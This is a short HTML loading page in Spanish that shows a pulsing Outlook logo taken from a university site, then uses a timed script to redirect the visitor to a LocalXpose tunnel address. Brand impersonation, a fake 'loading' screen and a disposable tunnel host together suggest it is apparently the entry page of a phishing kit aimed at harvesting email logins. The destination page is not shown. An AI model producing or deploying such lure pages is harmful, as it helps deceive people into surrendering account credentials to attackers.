<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Cargando...</title>
  <style>
    body {
      margin: 0;
      background-color: #fff; /* Fondo azul */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .loader-img {
      width: 120px;
      height: 120px;
      animation: pulse 1.5s infinite ease-in-out;
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
  <script>
    setTimeout(() => {
      window.location.href = "https://personalappnormal.loclx.io/htm";
    }, 3000);
  </script>
</head>
<body>
  <img class="loader-img" src="https://it.tamu.edu/microsoft-365/images/logos/Outlook-App-Hover-State.gif" alt="Cargando...">
</body>
</html>
